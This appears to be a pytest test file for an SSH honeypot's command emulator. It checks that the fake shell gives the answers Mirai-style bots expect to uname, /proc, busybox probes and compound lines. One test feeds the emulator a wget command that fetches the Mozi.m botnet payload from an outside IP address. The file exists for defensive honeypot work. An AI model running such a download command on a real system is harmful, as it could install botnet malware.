"""The commands real bots and operators run get real answers.

The old emulator lowercased the whole line, matched it against a dictionary,
and returned "command not found" for most of the system-inspection commands a
loader runs before it commits. Each of those is a point where the session
ends and the C2, the payload and the objective go unrecorded. These tests pin
the answers to the host identity and prove the compound-line handling.
"""

import pytest

from honeypot.core.config import config
from honeypot.core.identity import get_identity, reset_identity
from honeypot.core.modes import mode_handler
from honeypot.core.session import session_manager
from honeypot.core.shell_state import shell_states


@pytest.fixture(autouse=True)
def _capture_dir(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "session_capture_dir", str(tmp_path / "cap"))
    monkeypatch.setattr(config, "enable_anti_fingerprinting", True)
    reset_identity()
    yield
    reset_identity()


@pytest.fixture
async def session():
    sid = await session_manager.create_session("ssh", "203.0.113.5", 51000)
    yield sid
    shell_states.drop(sid)


async def run(sid, command, is_root=True, username="root"):
    return await mode_handler.handle_interaction(
        sid, "ssh", "command",
        {"command": command, "username": username, "is_root": is_root},
    )


async def test_uname_variants_agree_with_the_identity(session):
    i = get_identity()
    assert (await run(session, "uname -m")).strip() == i.arch
    assert (await run(session, "uname -r")).strip() == i.kernel
    assert (await run(session, "uname -n")).strip() == i.hostname
    assert i.kernel in (await run(session, "uname -a"))


async def test_hostname_is_stable_not_random(session):
    first = (await run(session, "hostname")).strip()
    second = (await run(session, "hostname")).strip()
    assert first == second == get_identity().hostname


async def test_cpu_and_memory_commands_answer(session):
    i = get_identity()
    assert (await run(session, "nproc")).strip() == str(i.cpu_cores)
    assert i.cpu_model in (await run(session, "cat /proc/cpuinfo"))
    assert "MemTotal" in (await run(session, "cat /proc/meminfo"))
    assert "Mem:" in (await run(session, "free"))
    assert "command not found" not in (await run(session, "lscpu"))


async def test_the_commands_the_audit_found_missing_now_answer(session):
    for cmd in ("id", "w", "who", "ps aux", "df -h", "uptime", "env",
                "which curl", "lsb_release -a", "ip addr"):
        out = await run(session, cmd)
        assert "command not found" not in out, cmd


async def test_a_compound_line_runs_each_segment(session):
    out = await run(session, "cd /tmp; pwd")
    assert "/tmp" in out


async def test_and_or_honour_the_previous_exit_code(session):
    # cd into a missing dir fails, so the && branch must not run.
    out = await run(session, "cd /nope/missing && echo REACHED")
    assert "REACHED" not in out
    # ... and the || branch must.
    out = await run(session, "cd /nope/missing || echo FALLBACK")
    assert "FALLBACK" in out


async def test_case_is_preserved_for_payload_paths(session):
    # Mirai fetches /Mozi.m; lowercasing it broke the lookup and the event.
    await run(session, "cd /tmp")
    await run(session, "wget http://185.220.101.5/Mozi.m -O Mozi.m")
    listing = await run(session, "ls")
    assert "Mozi.m" in listing
    record = await session_manager.get_session(session)
    url = [e for e in record.network_events if e["event_type"] == "file_download"][0]["url"]
    assert url.endswith("/Mozi.m")


async def test_a_pipe_filters_the_left_sides_output(session):
    out = await run(session, "cat /proc/cpuinfo | grep 'model name' | head -n 1")
    assert out.count("\n") == 1
    assert "model name" in out


async def test_busybox_probe_gets_the_applet_not_found_wording(session):
    # Mirai greps the reply to /bin/busybox <TOKEN> for "applet not found".
    out = await run(session, "/bin/busybox MIRAI")
    assert "applet not found" in out


async def test_sh_dash_c_runs_the_inner_line(session):
    out = await run(session, "sh -c 'cd /tmp; pwd'")
    assert "/tmp" in out


async def test_last_login_is_not_the_attacker(session):
    welcome = await mode_handler.handle_interaction(
        session, "ssh", "auth_success", {"source_ip": "203.0.113.5", "username": "root"},
    )
    assert "Last login:" in welcome
    assert "203.0.113.5" not in welcome


async def test_the_prompt_carries_the_identity_hostname(session):
    prompt = await mode_handler.handle_interaction(
        session, "ssh", "prompt", {"username": "root", "is_root": True},
    )
    assert get_identity().hostname in prompt
